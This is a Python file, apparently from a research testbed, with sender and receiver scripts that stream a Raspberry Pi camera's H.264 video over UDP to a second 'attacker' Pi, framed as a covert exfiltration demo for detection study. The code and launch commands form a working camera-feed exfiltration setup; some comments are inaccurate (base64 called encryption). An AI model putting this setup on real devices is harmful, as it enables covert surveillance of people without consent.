"""
================================================================================
Covert Channel Attack (CCA) Testbed — Dual Raspberry Pi 5 Video Exfiltration
================================================================================

PURPOSE:
   This testbed simulates a covert channel attack on IoT video streaming by
   exfiltrating video data from a legitimate Raspberry Pi 5 camera to an
   unauthorized receiver running on a second Raspberry Pi 5. The attack works
   by intercepting the camera stream and duplicating it to an attacker-controlled
   destination, demonstrating a data exfiltration vulnerability in networked
   IoT/Edge devices.

TESTBED TOPOLOGY:
   ┌─────────────────────────────────────────────────────────────────────┐
   │ Raspberry Pi 5 #1 (Normal/Legitimate Device)                        │
   │ ┌───────────────────────────────────────────────────────────────┐   │
   │ │ libcamera-vid (hardware camera capture)                        │   │
   │ │ ↓ H.264 stream (stdin)                                         │   │
   │ │ [SENDER SCRIPT] — UDP exfiltration to attacker (x.x.x.x)│   │
   │ └───────────────────────────────────────────────────────────────┘   │
   └─────────────────────────────────────────────────────────────────────┘
           ↓ UDP Port 12345 (covert channel)
   ┌─────────────────────────────────────────────────────────────────────┐
   │ Raspberry Pi 5 #2 (Attacker Receiver — x.x.x.x)               │
   │ ┌───────────────────────────────────────────────────────────────┐   │
   │ │ [RECEIVER SCRIPT] — Listen on UDP 12345                       │   │
   │ │ ↓ Reconstruct video stream                                    │   │
   │ │ Named Pipe (/tmp/video_pipe) → ffplay/ffmpeg for playback    │   │
   │ └───────────────────────────────────────────────────────────────┘   │
   └─────────────────────────────────────────────────────────────────────┘

ATTACK SCENARIO:
   1. Legitimate Device: Camera continuously captures video via libcamera-vid
   2. Exfiltration: SENDER script silently duplicates video stream via UDP
   3. Unauthorized Receiver: RECEIVER script reconstructs video on attacker device
   4. Impact: Attacker gains real-time access to camera feed without authorization

NETWORK PROTOCOL:
   - Transport: UDP (connectionless, fast, suitable for streaming)
   - Port: 12345 (arbitrary, non-privileged, routable across network)
   - Payload: H.264 video chunks (max 1400 bytes to avoid IP fragmentation)

SECURITY IMPLICATIONS:
   - Data exfiltration: Sensitive camera footage stolen without detection
   - Side-channel Detection: Power signatures reveal ongoing attack

THREAT MODEL:
   the sender device (Raspberry Pi #1) is compromised by malicious code in sender.py 
   The attacker's malicious code hijacks the camera stream and duplicates it to a
   second device under attacker control.

HARDWARE REQUIREMENTS:
   - 2x Raspberry Pi 5 (sufficient CPU for H.264 streaming)
   - Raspberry Pi Camera Module (or USB camera)
   - Network connectivity (Ethernet or WiFi)
   - libcamera-vid (camera capture tool)
   - ffplay/ffmpeg (video playback, optional)

SOFTWARE REQUIREMENTS:
   - Python 3.x (socket, os, fcntl, subprocess modules)
   - libcamera-vid (Raspberry Pi OS default)
   - ffmpeg/ffplay (for video visualization on receiver)

================================================================================
"""

# ============================================================================
# SENDER SCRIPT — Exfiltrate Video from Compromised Raspberry Pi (sender.py)
# ============================================================================

import socket
import sys
import base64

"""
SENDER MODULE: Hijacks camera stream and exfiltrates to unauthorized receiver
"""

# ============================================================================
# CONFIGURATION: Network Destination
# ============================================================================

# IP address of the attacker's receiver device (Raspberry Pi #2)
# This is the unauthorized destination where video will be exfiltrated
DEST_IP = "x.x.x.x"

# UDP port on the attacker's device
# Must match the LISTEN_PORT on the receiver
DEST_PORT = 12345

# ============================================================================
# CONFIGURATION: Network Parameters
# ============================================================================

# Maximum UDP payload size per packet
# Set to 1400 bytes to prevent IP-layer fragmentation:
# - Standard IPv4 MTU (Maximum Transmission Unit) = 1500 bytes
# - IPv4 header = 20 bytes
# - UDP header = 8 bytes
# - Usable payload = 1500 - 20 - 8 = 1472 bytes
# Using 1400 provides margin for safety and different network configurations
MAX_PAYLOAD_SIZE = 1400  # bytes per UDP packet

# ============================================================================
# NETWORK SETUP
# ============================================================================

# Create UDP socket (connectionless, datagram-based)
# socket.AF_INET: IPv4 protocol family (IP addresses like 192.168.x.x)
# socket.SOCK_DGRAM: Datagram socket (UDP, not TCP)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ============================================================================
# MAIN EXFILTRATION FUNCTION
# ============================================================================

def send_udp_video():
    """
    Read video stream from stdin (piped from libcamera-vid) and exfiltrate
    it via UDP to the attacker's receiver.
    
    FLOW:
    1. libcamera-vid captures H.264 video → stdout
    2. Shell pipe: libcamera-vid --stdout | python3 sender.py
    3. SENDER reads from sys.stdin.buffer (binary stream)
    4. Chunks video into 1400-byte packets
    5. Sends each packet to DEST_IP:DEST_PORT via UDP
    6. Logs packet size for monitoring/debugging
    
    """
    
    while True:
        # Read up to MAX_PAYLOAD_SIZE bytes from stdin
        # stdin.buffer is the binary stream (not text)
        # Returns empty bytes when stream ends (camera closed)
        chunk = sys.stdin.buffer.read(MAX_PAYLOAD_SIZE)
        
        # Exit loop if stream ended (no more video data)
        if not chunk:
            print("Stream ended. Exiting sender.")
            return
        
        # Optional: Base64 encode the chunk
        # Uncomment if encryption is desired
        # chunk = base64.b64encode(chunk)
        
        # Send the video chunk as a UDP packet to the attacker's device
        # sendto() is non-blocking: sends immediately without waiting for response
        sock.sendto(chunk, (DEST_IP, DEST_PORT))
        
        # Log packet transmission (for debugging and monitoring)
        print(f"Sent {len(chunk)} bytes to {DEST_IP}:{DEST_PORT}")

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    """
    Main entry point for the sender exfiltration script.
    """
    try:
        send_udp_video()
    except KeyboardInterrupt:
        print("\nStream interrupted by user.")
    finally:
        sock.close()
        print("Socket closed. Sender stopped.")


# ============================================================================
# RECEIVER SCRIPT — Accept Exfiltrated Video on Attacker Device (receiver.py)
# ============================================================================

import socket
import os
import fcntl
import subprocess

"""
RECEIVER MODULE: Accepts exfiltrated video and reconstructs stream for playback
"""

# ============================================================================
# CONFIGURATION: Listening Port & Named Pipe
# ============================================================================

# UDP port to listen on for incoming video packets
# MUST match DEST_PORT from the sender script
LISTEN_PORT = 12345

# Path to named pipe (FIFO) for video data
# Named pipe allows UDP receiver and ffplay/ffmpeg to communicate asynchronously
# Location: /tmp (temporary filesystem in memory on Raspberry Pi)
VIDEO_PIPE = "/tmp/video_pipe"

# Buffer size for the named pipe
# Set to 100 MB to handle video chunks without blocking
# Larger buffer = can tolerate UDP jitter/packet arrival variance
PIPE_BUFFER_SIZE = 100048576  # 100 MB (in bytes)

# ============================================================================
# NAMED PIPE SETUP
# ============================================================================

# Create the named pipe (FIFO) if it doesn't already exist
# Named pipe allows one process to write (receiver) and another to read (ffplay)
if not os.path.exists(VIDEO_PIPE):
    os.mkfifo(VIDEO_PIPE)

# Open the named pipe in write-only, non-blocking mode
# O_WRONLY: write-only (receiver writes video, ffplay reads)
# O_NONBLOCK: non-blocking (write doesn't wait if buffer full)
pipe_fd = os.open(VIDEO_PIPE, os.O_WRONLY | os.O_NONBLOCK)

# Set the pipe buffer size to accommodate video chunks and network jitter
# Prevents UDP packets from being dropped due to full pipe buffer
fcntl.fcntl(pipe_fd, fcntl.F_SETPIPE_SZ, PIPE_BUFFER_SIZE)

# ============================================================================
# NETWORK SETUP
# ============================================================================

# Create UDP socket to receive incoming video packets
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Bind to the listening port on all available network interfaces
# "": wildcard (listen on all interfaces: eth0, wlan0, etc.)
# LISTEN_PORT: port number (12345)
sock.bind(("", LISTEN_PORT))

# ============================================================================
# MAIN RECEPTION FUNCTION
# ============================================================================

def receive_udp_video():
    """
    Listen for incoming UDP packets containing exfiltrated video data.
    Write received chunks to the named pipe for playback/processing.
    
    FLOW:
    1. sock.recvfrom() blocks until a UDP packet arrives
    2. Extract video chunk from the UDP packet
    3. Write chunk to /tmp/video_pipe (named pipe)
    4. ffplay reads from the pipe asynchronously (if running)
    5. Loop continues indefinitely
    
    """
    
    while True:
        # Receive one UDP packet (max 1400 bytes, matches sender chunk size)
        # recvfrom() returns: (chunk, sender_address)
        # sender_address = (sender_IP, sender_port) for logging
        chunk, addr = sock.recvfrom(1400)  # Receive UDP packet (max 1400 bytes)
        
        # Check if chunk is non-empty (should always be true, but safe check)
        if chunk:
            try:
                # Write received video data to the named pipe
                # This is a blocking operation if pipe buffer is full
                os.write(pipe_fd, chunk)
                
                # Log successful write (for debugging and monitoring)
                print(f"Received and wrote {len(chunk)} bytes to the pipe.")
                
            except Exception as e:
                # Handle errors (e.g., pipe closed by ffplay, disk full, etc.)
                # Continue receiving even if write fails
                print(f"Error writing to pipe: {e}")

# ============================================================================
# RECEIVER INITIALIZATION
# ============================================================================

def start_receiver():
    """
    Initialize and start the receiver listening loop.
    This function blocks indefinitely, waiting for and processing UDP packets.
    """
    print("Receiver started. Waiting for UDP packets...")
    receive_udp_video()

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    """
    Main entry point for the receiver script.
    """
    try:
        start_receiver()
    except KeyboardInterrupt:
        print("\nReceiver interrupted by user.")
    finally:
        sock.close()
        os.close(pipe_fd)
        print("Receiver stopped.")

# ============================================================================
# DEPLOYMENT & TESTING
# ============================================================================
"""
QUICK START:
    1. Edit DEST_IP in SENDER script (target attacker IP)
    2. Confirm LISTEN_PORT matches (both should use 12345)
    
    On Attacker Device (Raspberry Pi #2):
    $ sudo python3 receiver.py
    $ ffplay -f h264 -i /tmp/video_pipe -analyzeduration 200000000 -probesize 5000000 &
    
    On Compromised Device (Raspberry Pi #1):
    $ libcamera-vid -t 0 --width 640 --height 480 --framerate 30 --codec h264 --libav-format h264 -o - | sudo python3 sender.py
"""